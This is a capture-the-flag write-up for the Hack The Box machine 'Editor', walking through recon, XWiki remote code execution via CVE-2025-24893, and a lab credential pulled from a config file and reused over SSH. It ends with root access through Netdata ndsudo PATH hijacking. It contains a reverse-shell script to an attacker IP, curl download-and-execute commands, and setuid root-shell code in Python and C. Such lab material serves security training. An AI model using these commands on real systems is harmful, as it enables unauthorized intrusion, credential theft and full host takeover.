---
icon: pen-to-square
coverY: 34.242614707730986
---

# HTB-EDITOR

<figure><img src="../../../../.gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>

***

### Attack Flow

<figure><img src="../../../../.gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>

***

### Reconnaissance & Initial Enumeration

#### Step 1.1: Network Scanning with Nmap

The first step in any penetration test is to identify what services are running on the target. We use Nmap to perform a comprehensive scan.

**Command executed:**

```bash
rustscan 10.129.xx.xxx blah blah
```

**Scan results:**

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Editor - SimplistCode Pro
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    syn-ack Jetty 10.0.20
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
| http-webdav-scan:
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/
|_/xwiki/bin/logout/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**

1. **Port 22 (SSH)**: OpenSSH 8.9p1 - Standard remote access service
2. **Port 80 (HTTP)**: nginx 1.18.0 - Redirects to `editor.htb` domain
3. **Port 8080 (HTTP)**: Jetty 10.0.20 - Running XWiki application at `/xwiki/`

**Why these findings matter:**

* The HTTP redirect indicates we need to add the domain to our hosts file
* XWiki on port 8080 is a complex Java-based wiki platform that often has vulnerabilities
* The robots.txt reveals multiple administrative endpoints that could be attack vectors

#### Step 1.2: Host Configuration

Since the Nmap scan revealed a redirect to `editor.htb`, we need to add this to our `/etc/hosts` file to properly resolve the domain.

**Command executed:**

```bash
echo "10.129.223.246 editor.htb" | sudo tee -a /etc/hosts
```

**What this does:**

* Maps the IP address to the hostname `editor.htb`
* Allows our browser and tools to resolve the domain name
* Essential for accessing virtual hosts on the same IP

***

### Web Application Analysis

#### Step 2.1: Main Website Exploration (Port 80)

After adding the domain to our hosts file, we access the main website.

**Command executed:**

```bash
firefox http://editor.htb
```

<figure><img src="../../../../.gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>

**Observations:**

The website displays a page for "SimplistCode Pro" - a futuristic code editor. The page offers:

* Download button for `.deb` package (Linux installation file)
* Download button for `.exe` package (Windows installation file)
* Documentation link pointing to `wiki.editor.htb`

**What we notice:**

* The main site has minimal functionality
* The documentation link reveals a subdomain: `wiki.editor.htb`
* This suggests the actual attack surface might be on the subdomain

#### Step 2.2: Subdomain Discovery and Configuration

The documentation link revealed a new subdomain. We need to add this to our hosts file.

**Command executed:**

```bash
echo "10.129.xx.xx wiki.editor.htb" | sudo tee -a /etc/hosts
```

**Accessing the subdomain:**

```bash
firefox http://wiki.editor.htb
```

**Alternatively, we can access via port 8080 directly:**

```bash
firefox http://editor.htb:8080/xwiki/
```

***

### XWiki Application Discovery & Version Identification

#### Step 3.1: XWiki Interface Exploration

Upon accessing `wiki.editor.htb` or `http://editor.htb:8080/xwiki/`, we encounter the XWiki interface.

<figure><img src="../../../../.gitbook/assets/image (540).png" alt=""><figcaption></figcaption></figure>

**Initial observations:**

* XWiki is a Java-based enterprise wiki platform
* The interface shows a welcome page with two documentation posts
* The footer displays important version information: **XWiki 15.10.8**

**Why version information is critical:**

* Allows us to search for known vulnerabilities specific to this version
* Released versions can be cross-referenced with CVE databases
* Older versions often have publicly disclosed exploits

#### Step 3.2: Vulnerability Research

With the specific version identified (15.10.8), we search for known vulnerabilities.

**Research process:**

```bash
# Search for XWiki vulnerabilities
searchsploit xwiki

# Google search for version-specific CVEs
# Search terms: "XWiki 15.10.8 vulnerability", "XWiki CVE 2024"
```

**Critical finding: CVE-2025-24893**

This CVE affects XWiki and allows **arbitrary code execution for unauthenticated users**.

**Vulnerability details:**

* **CVE ID**: CVE-2025-24893
* **Affected Component**: Search functionality in XWiki
* **Attack Vector**: Groovy script injection through search parameters
* **Impact**: Remote Code Execution (RCE) without authentication
* **Exploitability**: Public proof-of-concept (PoC) available

**Why this vulnerability is severe:**

1. **No authentication required**: Anyone can exploit it
2. **Remote execution**: Can be exploited from anywhere
3. **Full system access**: Allows arbitrary command execution
4. **Public PoC available**: Script kiddies can easily exploit it

***

### Exploitation - Initial Access

#### Step 4.1: Exploit Acquisition

We find a public exploit for CVE-2025-24893 on GitHub.

**Command executed:**

```bash
# Clone the exploit repository
git clone https://github.com/Artemir-A/CVE-2025-24893-EXP.git
cd CVE-2025-24893-EXP

# Review the exploit code
cat CVE-2025-24893-EXP.py
```

#### Step 4.2: Initial Exploit Testing

Before attempting a reverse shell, we test if the exploit works by running a simple command.

**Command executed:**

```bash
python3 CVE-2025-24893-EXP.py -u 'http://wiki.editor.htb' -c whoami
```

**Initial result:**

```
===========================================================
                   CVE-2025-24893
            XWiki Remote Code Execution Exploit
                      Author: Artemir
===========================================================
 
[-] Request failed: Exceeded 30 redirects.
```

**Problem identified:** The exploit fails because XWiki is hosted at `/xwiki/` path, not at the root `/`. The script is causing infinite redirects.

#### Step 4.3: Exploit Modification

We need to modify the exploit to work with the correct URL structure.

**Editing the exploit:**

```bash
nano CVE-2025-24893-EXP.py
```

**Original code (Line 35):**

```python
exploit_path = f"/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
full_url = urljoin(url, exploit_path)
```

**Modified code (Line 35):**

```python
exploit_path = f"bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
full_url = urljoin(url, exploit_path)
```

**What changed:**

* Removed the leading `/` from `exploit_path`
* This allows `urljoin` to properly append to the provided base URL
* Now works correctly with `http://wiki.editor.htb/xwiki/`

#### Step 4.4: Testing Modified Exploit

**Command executed:**

```bash
python3 CVE-2025-24893-EXP.py -u 'http://wiki.editor.htb/xwiki/' -c whoami
```

**Successful result:**

```
===========================================================
                   CVE-2025-24893
            XWiki Remote Code Execution Exploit
                      Author: Artemir
===========================================================
 
[+] Command Output:
xwiki
```

**Success!** The exploit now works and returns `xwiki` - the user under which the XWiki service is running.

#### Step 4.5: Establishing Reverse Shell

Now that we can execute commands, we'll establish a proper reverse shell for better access.

**Step 1: Create reverse shell payload**

Create a file named `shell.sh` on your attacking machine:

```bash
nano shell.sh
```

**shell.sh contents:**

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1
```

**Important:** Replace `10.10.14.XX` with your HTB VPN IP address.

**Make the script executable:**

```bash
chmod +x shell.sh
```

**Step 2: Start HTTP server**

Host the shell script so the target can download it:

```bash
python3 -m http.server 80
```

**What this does:**

* Starts a simple HTTP server on port 80
* Serves files from the current directory
* Target machine can download our reverse shell script

**Step 3: Start netcat listener**

Open a new terminal and start a listener to catch the reverse shell:

```bash
nc -lvnp 4444
```

**Command breakdown:**

* `-l`: Listen mode
* `-v`: Verbose output
* `-n`: No DNS resolution (faster)
* `-p 4444`: Listen on port 4444

**Step 4: Download shell script to target**

```bash
python3 CVE-2025-24893-EXP.py -u 'http://wiki.editor.htb/xwiki/' \
                               -c 'curl 10.10.14.XX/shell.sh -o /tmp/shell'
```

**What this command does:**

* Uses the RCE exploit to execute `curl` command
* Downloads our `shell.sh` from our HTTP server
* Saves it to `/tmp/shell` on the target machine

**Step 5: Execute reverse shell**

```bash
python3 CVE-2025-24893-EXP.py -u 'http://wiki.editor.htb/xwiki/' \
                               -c 'bash /tmp/shell'
```

**What happens:**

* Executes the downloaded shell script
* Initiates a reverse connection to our listener
* We receive a shell as the `xwiki` user

**Step 6: Upgrade to interactive shell**

Once we receive the connection in our netcat listener, we upgrade to a fully interactive TTY shell:

```bash
# In the reverse shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background the shell with Ctrl+Z, then:
stty raw -echo; fg

# Press Enter twice, then:
export TERM=xterm
export SHELL=/bin/bash
```

**What this achieves:**

* Full terminal capabilities (tab completion, arrow keys, etc.)
* Proper terminal size and formatting
* Better command history and editing

**Current status:** We now have a stable shell as the `xwiki` user!

***

### Credential Discovery & Lateral Movement

#### Step 5.1: System Enumeration

Now that we have initial access, we need to gather information about the system and look for privilege escalation vectors.

**Check current user:**

```bash
whoami
# Output: xwiki
```

**Check system information:**

```bash
hostname
# Output: editor

uname -a
# Output: Linux editor 5.15.0-xxx-generic #xxx-Ubuntu SMP ...
```

**List users with login shells:**

```bash
cat /etc/passwd | grep -v nologin | grep -v false
```

**Key finding:**

* User `oliver` has a valid login shell
* This is our target for lateral movement

#### Step 5.2: XWiki Configuration Analysis

XWiki stores its database configuration in XML files. These often contain sensitive credentials.

**Searching for configuration files:**

```bash
find /etc/xwiki -type f 2>/dev/null
find /usr/lib/xwiki -name "*.xml" 2>/dev/null
```

**Locate the Hibernate configuration:**

```bash
ls -la /etc/xwiki/hibernate.cfg.xml
```

**Search for passwords in configuration:**

```bash
grep -i password /etc/xwiki/hibernate.cfg.xml
```

**Output:**

```xml
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
<property name="hibernate.connection.password">xwiki</property>
<property name="hibernate.connection.password">xwiki</property>
<property name="hibernate.connection.password"></property>
<property name="hibernate.connection.password">xwiki</property>
<property name="hibernate.connection.password">xwiki</property>
<property name="hibernate.connection.password"></property>
```

**Critical finding:** Password `theEd1t0rTeam99` discovered!

**Why this file is important:**

* Hibernate is a Java ORM (Object-Relational Mapping) framework
* This configuration file contains database connection details
* Passwords are often reused across different services
* Database passwords are sometimes used for user accounts

#### Step 5.3: Password Reuse Testing

With the discovered password, we attempt SSH access as user `oliver`.

**Command executed:**

```bash
ssh oliver@editor.htb
# When prompted for password, enter: theEd1t0rTeam99
```

**Alternative from our reverse shell:**

```bash
ssh oliver@localhost
# Password: theEd1t0rTeam99
```

**Success!** We can now log in as `oliver`.

**Why password reuse is dangerous:**

* Developers often use the same password for database and user accounts
* Compromise of one credential can lead to access to multiple systems
* This is why unique passwords for each service are critical

#### Step 5.4: User Flag Capture

Now that we have access as `oliver`, we can retrieve the user flag.

**Command executed:**

```bash
cd ~
ls -la
cat user.txt
```

**User flag captured!** 🎉

**Check user privileges:**

```bash
id
```

**Output:**

```
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

**Important observations:**

* User ID: 1000 (primary user on the system)
* Member of unusual group: `netdata`
* This group membership will be crucial for privilege escalation

***

### Privilege Escalation - Reconnaissance

#### Step 6.1: Sudo Enumeration

First, we check if `oliver` has any sudo privileges.

**Command executed:**

```bash
sudo -l
```

**Output:**

```
Sorry, user oliver may not run sudo on editor.
```

**Result:** No sudo privileges available. We need to find another escalation path.

#### Step 6.2: SUID Binary Enumeration

SUID binaries run with the privileges of their owner (often root), making them prime targets for privilege escalation.

**Command executed:**

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Command breakdown:**

* `find /`: Search from root directory
* `-perm -4000`: Find files with SUID bit set
* `-type f`: Only regular files
* `2>/dev/null`: Hide error messages

**Standard SUID binaries found:**

```
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
...
```

**No obviously exploitable SUID binaries** in standard locations.

#### Step 6.3: Group-Based Enumeration

We noticed `oliver` is a member of the `netdata` group. Let's investigate what files this group can access.

**Command executed:**

```bash
find / -group netdata 2>/dev/null
```

**Significant findings:**

```
/run/ebpf.pid
/run/netdata/netdata.pid
/tmp/netdata-ipc
/opt/netdata/var
/opt/netdata/var/cache
/opt/netdata/var/cache/netdata
/opt/netdata/var/cache/netdata/netdata-meta.db
/opt/netdata/var/cache/netdata/dbengine
...
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
...
```

**Key discovery:** Complete Netdata installation at `/opt/netdata/`

**What is Netdata:**

* Real-time performance monitoring tool for Linux systems
* Collects system metrics and provides web-based dashboard
* Often runs with elevated privileges to gather system information

#### Step 6.4: Netdata Service Investigation

**Check if Netdata is running:**

```bash
ps aux | grep netdata
```

**Check for listening ports:**

```bash
ss -tlnp | grep netdata
# OR
netstat -tlnp | grep netdata
```

**Output:**

```
tcp    0    0 127.0.0.1:19999    0.0.0.0:*    LISTEN    -
```

**Finding:** Netdata web interface is running on port 19999 (localhost only)

#### Step 6.5: Port Forwarding for Netdata Access

Since Netdata is only accessible from localhost, we need to forward the port to our attacking machine.

**SSH port forwarding command:**

```bash
# From your attacking machine
ssh -L 19999:localhost:19999 oliver@editor.htb
# Password: theEd1t0rTeam99
```

**Command breakdown:**

* `-L 19999:localhost:19999`: Forward local port 19999 to remote localhost:19999
* This creates an SSH tunnel allowing us to access the remote service

**Now access Netdata dashboard:**

<figure><img src="../../../../.gitbook/assets/image (542).png" alt=""><figcaption></figcaption></figure>

```bash
firefox http://localhost:19999
```

**Netdata Dashboard Observations:**

* Alert symbol visible in upper right corner
* Warning about outdated version
* Version displayed: **1.45.2**
* This version is over a year old!

#### Step 6.6: Netdata Vulnerability Research

With the specific version (1.45.2), we research known vulnerabilities.

**Search for vulnerabilities:**

```bash
searchsploit netdata
```

**Google searches:**

* "Netdata 1.45.2 vulnerability"
* "Netdata CVE 2024"
* "Netdata privilege escalation"

**Critical finding: CVE-2024-23019**

**Vulnerability details:**

* **CVE ID**: CVE-2024-23019 (also tracked as GHSA-pmhq-4cxq-wj93)
* **Component**: ndsudo binary
* **Vulnerability Type**: Untrusted search path vulnerability
* **Impact**: Local privilege escalation to root
* **Prerequisites**: Access to `ndsudo` binary (via `netdata` group membership)

**How the vulnerability works:**

1. `ndsudo` is a SUID binary that runs with root privileges
2. It allows execution of specific whitelisted commands
3. Instead of using absolute paths for commands, it searches the `PATH` environment variable
4. Attacker can manipulate `PATH` to point to malicious executables
5. When `ndsudo` executes a command, it runs the attacker's version as root

#### Step 6.7: ndsudo Binary Analysis

**Locate the ndsudo binary:**

```bash
find /opt/netdata -iname ndsudo -exec ls -la {} \;
```

**Output:**

```
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

**Permissions breakdown:**

* `-rwsr-x---`: SUID bit is set (the `s` in `-rws`)
* Owner: `root`
* Group: `netdata`
* Only owner and group members can execute

**Since we're in the `netdata` group, we can execute this binary!**

**Check what commands ndsudo supports:**

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help
```

**Output:**

```
ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme 
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli 
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli 
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf 
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```

**Key observations:**

1. **Available commands**: nvme, megacli, arcconf
2. **Critical vulnerability**: "The program searches for executables in the system path"
3. **No absolute paths**: Commands like `nvme`, `megacli`, and `arcconf` are searched in PATH
4. **SUID execution**: All commands run with root privileges

**Exploitation strategy:**

* Create a fake executable (e.g., `nvme`) in a directory we control
* Modify PATH to search our directory first
* Execute ndsudo with the command name
* Our malicious binary runs as root!

***

### Privilege Escalation - Execution

#### Step 7.1: Malicious Binary Creation

We'll create a fake `nvme` executable that spawns a root shell.

**Choose a writable location:**

```bash
cd /dev/shm
```

**Why /dev/shm:**

* Shared memory filesystem (RAM-based)
* World-writable by default
* No `noexec` mount option typically
* Cleaned on reboot (removes evidence)

**Create the malicious Python script:**

```bash
nano nvme
```

**nvme script contents:**

```python
#!/usr/bin/env python3
import os

os.setuid(0)
os.system('/bin/bash')
```

**Script breakdown:**

* `#!/usr/bin/env python3`: Shebang for Python 3 execution
* `os.setuid(0)`: Set user ID to 0 (root)
* `os.system('/bin/bash')`: Execute bash shell with root privileges

**Make the script executable:**

```bash
chmod +x nvme
```

**Verify the script:**

```bash
ls -la nvme
file nvme
cat nvme
```

#### Step 7.2: Alternative Approach - C Binary (More Reliable)

For a more reliable approach, we can create a C binary instead of a Python script.

**Create C source code on attacking machine:**

```bash
nano root_shell.c
```

**root\_shell.c contents:**

```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);    // Set user ID to root
    setgid(0);    // Set group ID to root
    execl("/bin/bash", "bash", "-i", NULL);  // Execute interactive bash
    return 0;
}
```

**Compile the binary:**

```bash
gcc root_shell.c -o nvme
```

**Transfer to target machine:**

**Option 1: Using SCP:**

```bash
scp nvme oliver@editor.htb:/dev/shm/
```

**Option 2: Using HTTP server:**

```bash
# On attacking machine
python3 -m http.server 80

# On target machine
wget http://10.10.14.XX/nvme -O /dev/shm/nvme
chmod +x /dev/shm/nvme
```

#### Step 7.3: PATH Manipulation

Now we modify the PATH environment variable to prioritize our malicious directory.

**Export new PATH:**

```bash
export PATH=/dev/shm:$PATH
```

**What this does:**

* Prepends `/dev/shm` to the existing PATH
* System searches `/dev/shm` first for executables
* When `ndsudo` looks for `nvme`, it finds our malicious version first

**Verify PATH is set correctly:**

```bash
echo $PATH
```

**Output should start with:**

```
/dev/shm:/usr/local/bin:/usr/bin:/bin:...
```

**Verify which nvme will be executed:**

```bash
which nvme
```

**Output:**

```
/dev/shm/nvme
```

**Perfect!** Our malicious binary will be executed instead of the real `nvme`.

#### Step 7.4: Exploitation Execution

Now we execute ndsudo with one of the whitelisted commands.

**Command executed:**

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

**What happens:**

1. `ndsudo` is executed (runs with SUID as root)
2. `nvme-list` command is requested
3. `ndsudo` searches PATH for `nvme` executable
4. Finds `/dev/shm/nvme` first (our malicious binary)
5. Executes our binary with root privileges
6. Our script calls `setuid(0)` and spawns bash
7. We get a root shell!

**Expected output:**

```bash
root@editor:/dev/shm#
```

**Verify root access:**

```bash
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root) groups=0(root)
```

**Success!** We now have complete root access to the system! 🎉🎉🎉

***

### Post-Exploitation

#### Step 8.1: Root Flag Capture

**Navigate to root directory:**

```bash
cd /root
```

**List contents:**

```bash
ls -la
```

**Capture the root flag:**

```bash
cat root.txt
```

**Root flag captured!**

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (543).png" alt=""><figcaption></figcaption></figure>
